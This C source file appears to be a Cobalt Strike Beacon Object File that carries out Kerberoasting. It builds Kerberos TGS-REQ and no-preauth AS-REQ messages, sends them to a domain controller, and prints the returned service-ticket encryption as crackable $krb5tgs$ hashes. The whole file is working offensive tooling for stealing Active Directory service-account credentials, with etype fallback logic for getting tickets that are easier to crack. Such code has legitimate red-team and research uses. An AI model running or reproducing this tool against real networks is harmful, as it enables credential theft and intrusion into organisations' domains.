#include "_include/asn_encode.c"
#include "_include/asn_decode.c"
#include "_include/crypt_b64.c"
#include "_include/crypt_dec.c"
#include "_include/connection.c"

// Encryption type constants - define here if not already in kerb_struct.h
#ifndef aes256_cts_hmac_sha1
#define aes256_cts_hmac_sha1  18
#endif
#ifndef aes128_cts_hmac_sha1
#define aes128_cts_hmac_sha1  17
#endif
#ifndef rc4_hmac_num
#define rc4_hmac_num          23
#endif

// KDC error codes
#define KDC_ERR_ETYPE_NOSUPP  0x0E   // 14 - KDC has no support for etype

void DisplayTGShash(KRB_CRED cred, BOOL kerberoastDisplay, char* kerberoastUser, char* kerberoastDomain) {
    int encType = cred.tickets[0].enc_part.etype;
    int snameLenth = 0;
    for (int i = 0; i < cred.enc_part.ticket_info[0].sname.name_count; i++) {
        snameLenth += my_strlen(cred.enc_part.ticket_info[0].sname.name_string[i]) + 1;
    }

    int index = 0;
    char* sname = MemAlloc(snameLenth);
    for (int i = 0; i < cred.enc_part.ticket_info[0].sname.name_count; i++) {
        int l = my_strlen(cred.enc_part.ticket_info[0].sname.name_string[i]);
        MemCpy(sname + index, cred.enc_part.ticket_info[0].sname.name_string[i], l);
        index += l;
        sname[index++] = '/';
    }
    sname[--snameLenth] = 0;

    int kerberoastUserLength   = my_strlen(kerberoastUser);
    int kerberoastDomainLength = my_strlen(kerberoastDomain);
    int hashStringLength = 19 + kerberoastUserLength + kerberoastDomainLength + snameLenth + cred.tickets[0].enc_part.cipher_size * 2;
    char* hashString = MemAlloc(hashStringLength);

    if (encType == 18 || encType == 17) {
        MemCpy(hashString, "$krb5tgs$17$", 12);
        MemCpy(hashString + 12, kerberoastUser, kerberoastUserLength);
        hashString[12 + kerberoastUserLength] = '$';
        MemCpy(hashString + 13 + kerberoastUserLength, kerberoastDomain, kerberoastDomainLength);
        MemCpy(hashString + 13 + kerberoastUserLength + kerberoastDomainLength, "$*", 2);
        MemCpy(hashString + 15 + kerberoastUserLength + kerberoastDomainLength, sname, snameLenth);
        MemCpy(hashString + 15 + kerberoastUserLength + kerberoastDomainLength + snameLenth, "*$", 2);

        char* c1 = hashString + 17 + kerberoastUserLength + kerberoastDomainLength + snameLenth;
        my_tohex(cred.tickets[0].enc_part.cipher + cred.tickets[0].enc_part.cipher_size - 12, 12, &c1, 25);
        hashString[17 + kerberoastUserLength + kerberoastDomainLength + snameLenth + 24] = '$';
        char* c2 = hashString + 18 + kerberoastUserLength + kerberoastDomainLength + snameLenth + 24;
        my_tohex(cred.tickets[0].enc_part.cipher, cred.tickets[0].enc_part.cipher_size - 12, &c2, (cred.tickets[0].enc_part.cipher_size - 12) * 2 + 1);

        if (encType == 18)
            hashString[10] = '8';   // $krb5tgs$17$ -> $krb5tgs$18$
    }
    else {
        MemCpy(hashString, "$krb5tgs$23$*", 13);
        MemCpy(hashString + 13, kerberoastUser, kerberoastUserLength);
        hashString[13 + kerberoastUserLength] = '$';
        MemCpy(hashString + 14 + kerberoastUserLength, kerberoastDomain, kerberoastDomainLength);
        hashString[14 + kerberoastUserLength + kerberoastDomainLength] = '$';
        MemCpy(hashString + 15 + kerberoastUserLength + kerberoastDomainLength, sname, snameLenth);
        MemCpy(hashString + 15 + kerberoastUserLength + kerberoastDomainLength + snameLenth, "*$", 2);

        char* c1 = hashString + 17 + kerberoastUserLength + kerberoastDomainLength + snameLenth;
        my_tohex(cred.tickets[0].enc_part.cipher, 16, &c1, 33);
        hashString[17 + kerberoastUserLength + kerberoastDomainLength + snameLenth + 32] = '$';
        char* c2 = hashString + 18 + kerberoastUserLength + kerberoastDomainLength + snameLenth + 32;
        my_tohex(cred.tickets[0].enc_part.cipher + 16, cred.tickets[0].enc_part.cipher_size - 16, &c2, (cred.tickets[0].enc_part.cipher_size - 16) * 2 + 1);
    }

    PRINT_OUT("\n%s\n", hashString);
}

BOOL New_PA_DATA(char* crealm, char* cname, Ticket providedTicket, EncryptionKey clientKey, BOOL opsec, byte* req_body, int req_body_length, PA_DATA* pa_data) {

    AP_REQ* ap_req = MemAlloc(sizeof(AP_REQ));
    if (!ap_req) {
        PRINT_OUT("[x] Failed alloc memory");
        return TRUE;
    }
    ap_req->pvno = 5;
    ap_req->msg_type = KERB_AP_REQ;
    ap_req->ap_options = 0;
    ap_req->ticket = providedTicket;
    ap_req->keyUsage = KRB_KEY_USAGE_TGS_REQ_PA_AUTHENTICATOR;
    ap_req->key = clientKey;

    DateTime dt = GetGmTimeAdd(0);

    if (my_copybuf(&(ap_req->authenticator.crealm), crealm, my_strlen(crealm) + 1)) return TRUE;

    ap_req->authenticator.authenticator_vno = 5;
    ap_req->authenticator.ctime = dt;
    ap_req->authenticator.cname.name_count = 1;
    ap_req->authenticator.cname.name_count = PRINCIPAL_NT_PRINCIPAL;
    ap_req->authenticator.cname.name_string = MemAlloc(sizeof(void*) * ap_req->authenticator.cname.name_count);
    if (!ap_req->authenticator.cname.name_string) {
        PRINT_OUT("[x] Failed alloc memory");
        return TRUE;
    }
    if (my_copybuf(&(ap_req->authenticator.cname.name_string[0]), cname, my_strlen(cname) + 1)) return TRUE;

    pa_data->type = PADATA_AP_REQ;
    pa_data->value = ap_req;
    return FALSE;
}

BOOL NewTGS_REP(AsnElt asn_TGS_REP, TGS_REP* tgs_rep) {
    if (asn_TGS_REP.tagValue != KERB_TGS_REP) {
        PRINT_OUT("TGS-REP tag value should be 13");
        return TRUE;
    }
    if ((asn_TGS_REP.subCount != 1) || (asn_TGS_REP.sub[0].tagValue != 16)) {
        PRINT_OUT("First TGS-REP sub should be a sequence");
        return TRUE;
    }

    AsnElt* kdc_rep = asn_TGS_REP.sub[0].sub;
    for (int i = 0; i < asn_TGS_REP.sub[0].subCount; i++) {
        int tagValue = kdc_rep[i].tagValue;
        if ( tagValue == 0 ) {
            if (AsnGetInteger(&(kdc_rep[i].sub[0]), &(tgs_rep->pvno))) return TRUE;
        }
        if ( tagValue == 1 ) {
            if (AsnGetInteger(&(kdc_rep[i].sub[0]), &(tgs_rep->msg_type))) return TRUE;
        }
        if ( tagValue == 2 ) {
            if (AsnGetPaData(&(kdc_rep[i].sub[0]), &(tgs_rep->padata))) return TRUE;
        }
        if ( tagValue == 3 ) {
            if (AsnGetString(&(kdc_rep[i].sub[0]), &(tgs_rep->crealm))) return TRUE;
        }
        if ( tagValue == 4 ) {
            if (AsnGetPrincipalName(&(kdc_rep[i].sub[0]), &(tgs_rep->cname))) return TRUE;
        }
        if ( tagValue == 5 ) {
            if (AsnGetTicket(&(kdc_rep[i].sub[0].sub[0]), &(tgs_rep->ticket))) return TRUE;
        }
        if ( tagValue == 6 ) {
            if (AsnGetEncryptedData(&(kdc_rep[i].sub[0]), &(tgs_rep->enc_part))) return TRUE;
        }
    }
    return FALSE;
}

BOOL NewAS_REP(AsnElt asn_AS_REP, AS_REP* as_rep) {
    if ((asn_AS_REP.subCount != 1) || (asn_AS_REP.sub[0].tagValue != 16)) {
        PRINT_OUT("First AS-REP sub should be a sequence");
        return TRUE;
    }

    AsnElt* kdc_rep = asn_AS_REP.sub[0].sub;

    for (int i = 0; i < asn_AS_REP.sub[0].subCount; i++) {
        int tagValue = kdc_rep[i].tagValue;
        if ( tagValue == 0 ) {
            if (AsnGetInteger(&(kdc_rep[i].sub[0]), &(as_rep->pvno))) return TRUE;
        }
        if ( tagValue == 1 ) {
            if (AsnGetInteger(&(kdc_rep[i].sub[0]), &(as_rep->msg_type)))return TRUE;
        }
        if ( tagValue == 2 ) {
            as_rep->pa_data_count = kdc_rep[i].subCount;
            as_rep->pa_data = MemAlloc(as_rep->pa_data_count);
            for (int j = 0; j < as_rep->pa_data_count; j++) {
                PA_DATA padata = { 0 };
                if (AsnGetPaData(&(kdc_rep[i].sub[j].sub[0]), &padata)) return TRUE;
                as_rep->pa_data[j] = padata;
            }
        }
        if ( tagValue == 3 ) {
            if (AsnGetString(&(kdc_rep[i].sub[0]), &(as_rep->crealm))) return TRUE;
        }
        if ( tagValue == 4 ) {
            if (AsnGetPrincipalName(&(kdc_rep[i].sub[0]), &(as_rep->cname))) return TRUE;
        }
        if ( tagValue == 5 ) {
            if (kdc_rep[i].sub[0].subCount)
                if (AsnGetTicket(&(kdc_rep[i].sub[0].sub[0]), &(as_rep->ticket))) return TRUE;
        }
        if ( tagValue == 6 ) {
            if (AsnGetEncryptedData(&(kdc_rep[i].sub[0]), &(as_rep->enc_part))) return TRUE;
        }
    }
    kdc_rep = NULL;
    return FALSE;
}

BOOL NewTGS_REQ(char* userName, char* domain, char* sname, Ticket providedTicket, EncryptionKey clientKey, int requestEType, byte* tgs, BOOL opsec, BOOL u2u, BOOL unconstrained, char* targetDomain, char* s4uUser, BOOL keyList, BOOL renew, byte** reqBytes, int* reqBytesSize) {
    AS_REQ req = { 0 };

    req.pvno = 5;
    req.msg_type = 12;

    req.req_body.kdc_options = FORWARDABLE | RENEWABLE | RENEWABLEOK;
    req.req_body.till = 24 * 3600;
    ADVAPI32$SystemFunction036(&(req.req_body.nonce), 4);

    req.req_body.cname.name_type = PRINCIPAL_NT_PRINCIPAL;
    req.req_body.cname.name_count = 1;
    req.req_body.cname.name_string = MemAlloc(sizeof(void*) * req.req_body.cname.name_count);
    if (!req.req_body.cname.name_string) {
        PRINT_OUT("[x] Failed alloc memory");
        return TRUE;
    }
    if (my_copybuf(&(req.req_body.cname.name_string[0]), userName, my_strlen(userName) + 1)) return TRUE;

    int partsCount = 0;
    char** parts = my_strsplit( sname, '/', &partsCount );

    if (my_copybuf(&req.req_body.realm, targetDomain, my_strlen(targetDomain) + 1)) return TRUE;
    StrToUpper(req.req_body.realm);

    int etypeIndex = 0;
    req.req_body.etypes_count = 1;
    req.req_body.etypes = MemAlloc(sizeof(int) * req.req_body.etypes_count);
    if (!req.req_body.etypes) {
        PRINT_OUT("[x] Failed alloc memory");
        return TRUE;
    }
    req.req_body.etypes[etypeIndex++] = requestEType;

    if (partsCount == 1) {
        req.req_body.sname.name_type = PRINCIPAL_NT_SRV_INST;
        req.req_body.sname.name_count = 2;
        req.req_body.sname.name_string = MemAlloc(req.req_body.sname.name_count * sizeof(void*));
        my_copybuf(&(req.req_body.sname.name_string[0]), parts[0], my_strlen(parts[0]) + 1);
        my_copybuf(&(req.req_body.sname.name_string[1]), domain, my_strlen(domain) + 1);
    }
    else if (partsCount == 2) {
        req.req_body.sname.name_type = PRINCIPAL_NT_SRV_INST;
        req.req_body.sname.name_count = 2;
        req.req_body.sname.name_string = MemAlloc(req.req_body.sname.name_count * sizeof(void*));
        my_copybuf(&(req.req_body.sname.name_string[0]), parts[0], my_strlen(parts[0]) + 1);
        my_copybuf(&(req.req_body.sname.name_string[1]), parts[1], my_strlen(parts[1]) + 1);
    }
    else if (partsCount == 3) {
        req.req_body.sname.name_type = PRINCIPAL_NT_SRV_HST;
        req.req_body.sname.name_count = 3;
        req.req_body.sname.name_string = MemAlloc(req.req_body.sname.name_count * sizeof(void*));
        my_copybuf(&(req.req_body.sname.name_string[0]), parts[0], my_strlen(parts[0]) + 1);
        my_copybuf(&(req.req_body.sname.name_string[1]), parts[1], my_strlen(parts[1]) + 1);
        my_copybuf(&(req.req_body.sname.name_string[2]), parts[2], my_strlen(parts[2]) + 1);
    }
    else {
        PRINT_OUT("[X] Error: invalid TGS_REQ sname '%s'\n", sname);
    }

    byte* cksum_Bytes = NULL;
    int cksum_Bytes_length = 0;

    PA_DATA padata = { 0 };
    if (New_PA_DATA(domain, userName, providedTicket, clientKey, opsec, cksum_Bytes, cksum_Bytes_length, &padata)) return TRUE;

    req.pa_data_count = 1 + (opsec && s4uUser) + (s4uUser || opsec || (tgs && !u2u)) + keyList;
    int padata_index = 0;
    req.pa_data = MemAlloc(req.pa_data_count * sizeof(PA_DATA));
    req.pa_data[padata_index++] = padata;

    AsnElt reqAsn = { 0 };
    if (ReqToAsnEncode(req, 12, &reqAsn)) return TRUE;
    if (AsnToBytesEncode(&reqAsn, reqBytesSize, reqBytes)) return TRUE;

    return FALSE;
}

/*
 * TGS_inner: returns raw KDC error code via outErrorCode and the actual
 * ticket enc_part etype via outTicketEtype so the caller knows what the
 * KDC actually used (which may differ from requestEType).
 */
BOOL TGS_inner(char* userName, char* domain, Ticket providedTicket, EncryptionKey clientKey, char* service, int requestEType, char* domainController, byte* tgs, BOOL opsec, BOOL ptt, BOOL u2u, char* targetDomain, char* targetUser, BOOL display, BOOL keyList, byte** retTgsBytes, int* retTgsBytesLength, uint* outErrorCode, uint* outTicketEtype) {

    *outErrorCode = 0;
    *outTicketEtype = 0;

    PRINT_OUT("\n[*] Building TGS-REQ (etype %d) for: '%s'\n", requestEType, service);

    byte* tgsBytes = NULL;
    int   tgsBytesLength = 0;
    if (NewTGS_REQ(userName, domain, service, providedTicket, clientKey, requestEType, tgs, opsec, u2u, FALSE, targetDomain, targetUser, keyList, FALSE, &tgsBytes, &tgsBytesLength)) return TRUE;

    byte* response = NULL;
    int   responseSize = 0;
    sendBytes(domainController, "88", tgsBytes, tgsBytesLength, &response, &responseSize);
    if (responseSize == 0)
        return TRUE;

    AsnElt responseAsn = { 0 };
    if (BytesToAsnDecode(response, responseSize, &responseAsn)) return TRUE;

    if (responseAsn.tagValue == KERB_TGS_REP) {
        PRINT_OUT("[+] TGS request successful!\n");

        TGS_REP rep = { 0 };
        if (NewTGS_REP(responseAsn, &rep)) return TRUE;

        /* Return actual ticket etype to caller */
        *outTicketEtype = (uint)rep.ticket.enc_part.etype;

        byte* outBytes = NULL;
        int   outBytesLength = 0;
        if (decrypt(clientKey.key_value, clientKey.key_type, KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, rep.enc_part.cipher, rep.enc_part.cipher_size, &outBytes, &outBytesLength)) return TRUE;

        AsnElt ae = { 0 };
        if (BytesToAsnDecode(outBytes, outBytesLength, &ae)) return TRUE;

        EncKDCRepPart encRepPart = { 0 };
        if (AsnGetEncKDCRepPart(&(ae.sub[0]), &encRepPart)) return TRUE;

        KRB_CRED cred = { 0 };
        cred.pvno = 5;
        cred.msg_type = 22;
        cred.ticket_count = 1;
        cred.tickets = MemAlloc(cred.ticket_count * sizeof(Ticket));
        if (!cred.tickets) {
            PRINT_OUT("[x] Failed alloc memory");
            return TRUE;
        }
        cred.tickets[0] = rep.ticket;

        KrbCredInfo info = { 0 };

        info.key = encRepPart.key;
        if (my_copybuf(&(info.key.key_value), encRepPart.key.key_value, encRepPart.key.key_size)) return TRUE;

        if (my_copybuf(&(info.prealm), rep.crealm, my_strlen(rep.crealm) + 1)) return TRUE;

        info.pname = rep.cname;
        info.pname.name_string = MemAlloc(info.pname.name_count * sizeof(void*));
        for (int i = 0; i < info.pname.name_count; i++)
            if (my_copybuf(&(info.pname.name_string[i]), rep.cname.name_string[i], my_strlen(rep.cname.name_string[i]) + 1)) return TRUE;

        info.flags = encRepPart.flags;
        info.starttime = encRepPart.starttime;
        info.endtime = encRepPart.endtime;
        info.renew_till = encRepPart.renew_till;

        if (my_copybuf(&(info.srealm), rep.crealm, my_strlen(rep.crealm) + 1)) return TRUE;

        info.sname = encRepPart.sname;
        info.sname.name_string = MemAlloc(info.sname.name_count * sizeof(void*));
        for (int i = 0; i < info.sname.name_count; i++)
            if (my_copybuf(&(info.sname.name_string[i]), encRepPart.sname.name_string[i], my_strlen(encRepPart.sname.name_string[i]) + 1)) return TRUE;

        cred.enc_part.ticket_count = 1;
        cred.enc_part.ticket_info = MemAlloc(cred.enc_part.ticket_count * sizeof(KrbCredInfo));
        if (!cred.enc_part.ticket_info) {
            PRINT_OUT("[x] Failed alloc memory");
            return TRUE;
        }
        cred.enc_part.ticket_info[0] = info;

        AsnElt asnCred = { 0 };
        if (AsnKrbCredEncode(&cred, &asnCred)) return TRUE;

        byte* kirbiBytes = NULL;
        int   kirbiBytesSize = 0;
        if (AsnToBytesEncode(&asnCred, &kirbiBytesSize, &kirbiBytes)) return TRUE;

        *retTgsBytes = kirbiBytes;
        *retTgsBytesLength = kirbiBytesSize;
        return FALSE;
    }
    else if (responseAsn.tagValue == KERB_ERROR) {
        uint error_code = 0;
        if (AsnGetErrorCode(&(responseAsn.sub[0]), &error_code)) return TRUE;
        *outErrorCode = error_code;
        PRINT_OUT("\n\t[x] Kerberos error : %d\n", error_code);
    }
    else {
        PRINT_OUT("\n[X] Unknown application tag: %d\n", responseAsn.tagValue);
    }

    return TRUE;
}

static const char* EtypeName(uint etype) {
    switch (etype) {
        case aes256_cts_hmac_sha1: return "AES256";
        case aes128_cts_hmac_sha1: return "AES128";
        case rc4_hmac_num:         return "RC4";
        default:                   return "UNKNOWN";
    }
}

/*
 * TGS_BestEtype: tries AES256 -> AES128 -> RC4 in order.
 *
 * Two distinct downgrade scenarios:
 *
 * 1) KDC_ERR_ETYPE_NOSUPP (0x0E): KDC outright rejects the requested
 *    etype in the TGS-REQ. Rare in practice but possible with strict
 *    KDC etype policy. We fall through to the next candidate.
 *
 * 2) Silent downgrade: KDC accepts the TGS-REQ (etype negotiation
 *    applies to the TGS-REP session key encryption) but the service
 *    ticket's enc_part uses a lower etype because the service account
 *    lacks AES keys (no msDS-SupportedEncryptionTypes or set to RC4
 *    only). The TGS-REP succeeds, but ticket.enc_part.etype != requested.
 *    In this case retrying with a lower requested etype is pointless -
 *    the ticket etype is determined by the service account's keyset,
 *    not by what we asked for. We accept what we got and stop.
 */
BOOL TGS_BestEtype(char* userName, char* domain, Ticket providedTicket, EncryptionKey clientKey, char* service, char* domainController, byte* tgs, BOOL opsec, BOOL ptt, BOOL u2u, char* targetDomain, char* targetUser, BOOL display, BOOL keyList, byte** retTgsBytes, int* retTgsBytesLength) {

    int etypePriority[] = { aes256_cts_hmac_sha1, aes128_cts_hmac_sha1, rc4_hmac_num };
    int etypeCount = 3;

    for (int i = 0; i < etypeCount; i++) {
        int etype = etypePriority[i];
        PRINT_OUT("[*] Trying etype %s (%d)...\n", EtypeName(etype), etype);

        uint errCode = 0;
        uint ticketEtype = 0;
        BOOL result = TGS_inner(
            userName, domain, providedTicket, clientKey,
            service, etype,
            domainController, tgs, opsec, ptt, u2u,
            targetDomain, targetUser, display, keyList,
            retTgsBytes, retTgsBytesLength,
            &errCode, &ticketEtype
        );

        if (!result) {
            /* Report the ACTUAL ticket enc_part etype, not what we requested */
            PRINT_OUT("[+] Got ticket with etype %s (%d)\n", EtypeName(ticketEtype), ticketEtype);

            if ((int)ticketEtype != etype) {
                PRINT_OUT("[*] Note: requested %s but ticket encrypted with %s (service account keyset)\n",
                          EtypeName(etype), EtypeName(ticketEtype));
                PRINT_OUT("[*] Service account likely missing msDS-SupportedEncryptionTypes for AES\n");
            }
            return FALSE;
        }

        if (errCode == KDC_ERR_ETYPE_NOSUPP) {
            /* KDC rejected this etype at the TGS-REQ level, try next */
            PRINT_OUT("[-] KDC does not support etype %s, trying lower...\n", EtypeName(etype));
            continue;
        }

        /* Any other KDC error - stop, don't retry */
        PRINT_OUT("[x] Non-etype KDC error %d, aborting.\n", errCode);
        return TRUE;
    }

    PRINT_OUT("[x] All etypes exhausted - no ticket obtained.\n");
    return TRUE;
}

BOOL NewAS_REQ( char* pcUsername, char* pcDomain, EncryptionKey encKey, BOOL opsec, BOOL bPac, BOOL is_nopreauth, char* service, AS_REQ* as_req ) {
    as_req->pvno = 5;
    as_req->msg_type = KERB_AS_REQ;

    as_req->req_body.kdc_options = FORWARDABLE | RENEWABLE | RENEWABLEOK;
    as_req->req_body.till = 1 * 3600;
    ADVAPI32$SystemFunction036(&(as_req->req_body.nonce), 4);
    if (my_copybuf(&as_req->req_body.realm, pcDomain, my_strlen(pcDomain) + 1)) return TRUE;

    as_req->req_body.cname.name_type = PRINCIPAL_NT_PRINCIPAL;
    as_req->req_body.cname.name_count = 1;
    as_req->req_body.cname.name_string = MemAlloc(sizeof(void*) * as_req->req_body.cname.name_count);
    if (!as_req->req_body.cname.name_string) {
        PRINT_OUT("[x] Failed alloc memory");
        return TRUE;
    }
    if (my_copybuf(&(as_req->req_body.cname.name_string[0]), pcUsername, my_strlen(pcUsername) + 1)) return TRUE;

    int partsCount = 1;
    int index = 0;
    while (service[index]) {
        if (service[index] == '/')
            partsCount++;
        index++;
    }

    as_req->req_body.sname.name_count  = partsCount;
    as_req->req_body.sname.name_string = MemAlloc(sizeof(void*) * as_req->req_body.cname.name_count);
    as_req->req_body.sname.name_type   = PRINCIPAL_NT_PRINCIPAL;

    int partIndex = 0;
    int startIndex = 0;
    index = 0;
    while (service[index] && partIndex < partsCount) {
        if (service[index] == '/') {
            if (my_copybuf(&(as_req->req_body.sname.name_string[partIndex]), service + startIndex, index + 1 - startIndex)) return TRUE;
            as_req->req_body.sname.name_string[partIndex][index] = 0;
            startIndex = index + 1;
            partIndex++;
        }
        index++;
    }
    if (my_copybuf(&(as_req->req_body.sname.name_string[partIndex]), service + startIndex, index + 1 - startIndex)) return TRUE;

    as_req->pa_data_count = 1;
    as_req->pa_data = MemAlloc(sizeof(PA_DATA) * as_req->pa_data_count);
    if (!as_req->pa_data) {
        PRINT_OUT("[x] Failed alloc memory");
        return TRUE;
    }

    as_req->pa_data[0].type  = PADATA_PA_PAC_REQUEST;
    as_req->pa_data[0].value = MemAlloc(sizeof(KERB_PA_PAC_REQUEST));
    if (!as_req->pa_data[0].value) {
        PRINT_OUT("[x] Failed alloc memory");
        return TRUE;
    }
    ((KERB_PA_PAC_REQUEST*)as_req->pa_data[0].value)->include_pac = bPac;

    as_req->req_body.etypes_count = 1;
    as_req->req_body.etypes = MemAlloc(sizeof(int) * as_req->req_body.etypes_count);
    if (!as_req->req_body.etypes) {
        PRINT_OUT("[x] Failed alloc memory");
        return TRUE;
    }
    as_req->req_body.etypes[0] = encKey.key_type;

    return FALSE;
}

BOOL GetTGSRepHash(char* ticket, char* spn, char* userName, char* domainController, int requestEType) {
    int bytesSize = 0;
    byte* bytes = base64_decode(ticket, &bytesSize);

    KRB_CRED TGT = { 0 };
    AsnElt   asn_KRB_CRED = { 0 };
    if (BytesToAsnDecode3(bytes, bytesSize, FALSE, &asn_KRB_CRED)) return TRUE;
    if (AsnGetKrbCred(&(asn_KRB_CRED.sub[0]), &TGT)) return TRUE;

    char* tgtDomain = NULL;
    char* serviceName = TGT.tickets[0].sname.name_string[0];

    if (TGT.tickets[0].sname.name_count > 1 && my_strcmp(serviceName, "krbtgt") != 0) {
        PRINT_OUT("[X] Unable to request service tickets without a TGT, please rerun and provide a TGT to '/ticket'.\n");
        return FALSE;
    }
    else {
        tgtDomain = TGT.tickets[0].sname.name_string[1];
    }

    char* tgtUserName = TGT.enc_part.ticket_info[0].pname.name_string[0];
    char* domain = TGT.enc_part.ticket_info[0].prealm;
    StrToLower(domain);
    Ticket tr_ticket = TGT.tickets[0];
    EncryptionKey clientKey = TGT.enc_part.ticket_info[0].key;

    byte* tgsBytes = NULL;
    int tgsBytesLength = 0;

    /*
     * Use TGS_BestEtype: tries AES256 -> AES128 -> RC4.
     * Correctly reports the actual ticket etype regardless of what was requested.
     */
    if (TGS_BestEtype(tgtUserName, domain, tr_ticket, clientKey, spn, domainController, NULL, FALSE, FALSE, FALSE, tgtDomain, NULL, FALSE, FALSE, &tgsBytes, &tgsBytesLength)) return TRUE;

    if (tgsBytes) {
        KRB_CRED tgsKirbi = { 0 };
        AsnElt   asn_tgsKirbi = { 0 };
        if (BytesToAsnDecode(tgsBytes, tgsBytesLength, &asn_tgsKirbi)) return TRUE;
        if (AsnGetKrbCred(&(asn_tgsKirbi.sub[0]), &tgsKirbi)) return TRUE;

        DisplayTGShash(tgsKirbi, TRUE, userName, tgtDomain);
        return FALSE;
    }
    return TRUE;
}

BOOL GetTGSRepHash_nopreauth(char* nopreauth, char* spn, char* userName, char* domainController, char* domain, int requestEType) {
    EncryptionKey encKey = { 0 };
    encKey.key_type = requestEType;

    AS_REQ NoPreAuthASREQ = { 0 };
    if (NewAS_REQ(nopreauth, domain, encKey, FALSE, TRUE, TRUE, spn, &NoPreAuthASREQ)) return TRUE;

    AsnElt requestAsn = { 0 };
    if (ReqToAsnEncode(NoPreAuthASREQ, 10, &requestAsn)) return TRUE;

    int bRequestAsnSize = 0;
    byte* bRequestAsn = 0;
    if (AsnToBytesEncode(&requestAsn, &bRequestAsnSize, &bRequestAsn)) return TRUE;

    byte* response = NULL;
    int responseSize = 0;
    sendBytes(domainController, "88", bRequestAsn, bRequestAsnSize, &response, &responseSize);

    if (responseSize == 0)
        return TRUE;

    AsnElt responseAsn = { 0 };
    if (BytesToAsnDecode(response, responseSize, &responseAsn)) return TRUE;

    if (responseAsn.tagValue == KERB_AS_REP) {

        AS_REP rep = { 0 };
        if (NewAS_REP(responseAsn, &rep)) return TRUE;

        KRB_CRED cred = { 0 };
        cred.pvno = 5;
        cred.msg_type = 22;

        cred.ticket_count = 1;
        cred.tickets = MemAlloc(cred.ticket_count * sizeof(Ticket));
        if (!cred.tickets) {
            PRINT_OUT("[x] Failed alloc memory");
            return TRUE;
        }
        cred.tickets[0] = rep.ticket;

        KrbCredInfo info = { 0 };
        if (my_copybuf(&(info.prealm), domain, my_strlen(domain) + 1)) return TRUE;

        info.pname = rep.cname;
        info.pname.name_string = MemAlloc(info.pname.name_count * sizeof(void*));
        for (int i = 0; i < info.pname.name_count; i++)
            if (my_copybuf(&(info.pname.name_string[i]), rep.cname.name_string[i], my_strlen(rep.cname.name_string[i]) + 1)) return TRUE;

        if (my_copybuf(&(info.srealm), domain, my_strlen(domain) + 1)) return TRUE;

        info.sname = NoPreAuthASREQ.req_body.sname;
        info.sname.name_string = MemAlloc(info.sname.name_count * sizeof(void*));
        for (int i = 0; i < info.sname.name_count; i++)
            if (my_copybuf(&(info.sname.name_string[i]), NoPreAuthASREQ.req_body.sname.name_string[i], my_strlen(NoPreAuthASREQ.req_body.sname.name_string[i]) + 1)) return TRUE;

        cred.enc_part.ticket_count = 1;
        cred.enc_part.ticket_info = MemAlloc(cred.enc_part.ticket_count * sizeof(KrbCredInfo));
        if (!cred.enc_part.ticket_info) {
            PRINT_OUT("[x] Failed alloc memory");
            return TRUE;
        }
        cred.enc_part.ticket_info[0] = info;

        DisplayTGShash(cred, TRUE, userName, domain);
    }
    else if (responseAsn.tagValue == KERB_ERROR) {
        uint error_code = 0;
        if (AsnGetErrorCode(&(responseAsn.sub[0]), &error_code)) return TRUE;
        if (error_code == 0x19) {
            PRINT_OUT("[!] Pre-Authentication required!\n");
        }
    }
    else {
        return TRUE;
    }
    return FALSE;
}

/*
 * Kerberoast: nopreauth path still uses rc4_hmac because AS-REQ without
 * pre-auth always returns RC4 - the enc_part is keyed off the account
 * password, not a negotiated session key. AES fallback only makes sense
 * for the TGS path where we're encrypting with a TGT session key.
 */
void Kerberoast(char* spn, char* domain, char* dc, char* TGT, char* nopreauth) {
    PRINT_OUT("[*] Target SPN: %s\n", spn);

    if (nopreauth) {
        PRINT_OUT("[*] Using %s without pre-auth to request service tickets\n", nopreauth);
        GetTGSRepHash_nopreauth(nopreauth, spn, spn, dc, domain, rc4_hmac);
    }
    else {
        PRINT_OUT("[*] Using a TGT /ticket to request service tickets\n");
        GetTGSRepHash(TGT, spn, "USER", dc, 0 /* unused - negotiated internally */);
    }
}

void KERBEROAST_RUN( PCHAR Buffer, DWORD Length ) {
    PRINT_OUT("[*] Action: Kerberoasting\n");

    char* spn          = NULL;
    char* ticket       = NULL;
    char* dc           = NULL;
    char* domain       = NULL;
    char* nopreauth    = NULL;

    for (int i = 0; i < Length; i++) {
        i += GetStrParam(Buffer + i, Length - i, "/dc:", 4, &dc);
        i += GetStrParam(Buffer + i, Length - i, "/spn:", 5, &spn);
        i += GetStrParam(Buffer + i, Length - i, "/domain:", 8, &domain);
        i += GetStrParam(Buffer + i, Length - i, "/ticket:", 8, &ticket);
        i += GetStrParam(Buffer + i, Length - i, "/nopreauth:", 11, &nopreauth);
    }

    GetDomainInfo(&domain, &dc);
    if (domain == NULL || dc == NULL) {
        PRINT_OUT("[X] Could not retrieve domain information!\n\n");
        return;
    }

    if (spn == NULL) {
        PRINT_OUT("\n[X] You must supply a SPN!\n\n");
        return;
    }

    if ( nopreauth == NULL && ticket == NULL ) {
        PRINT_OUT("\n[X] You must supply /nopreauth, /ticket or /credUser !\n\n");
        return;
    }

    Kerberoast(spn, domain, dc, ticket, nopreauth);
}

VOID go( IN PCHAR Buffer, IN ULONG Length ) {
    INIT_BOF();

    datap parser;
    BeaconDataParse(&parser, Buffer, Length);
    DWORD PARAM_SIZE = 0;
    PBYTE PARAM = BeaconDataExtract(&parser, &PARAM_SIZE);

    if( LoadFunc() )
        PRINT_OUT("%s\n", "Modules not loaded");
    else
        KERBEROAST_RUN( PARAM, PARAM_SIZE );

    FreeBank();

    END_BOF();
}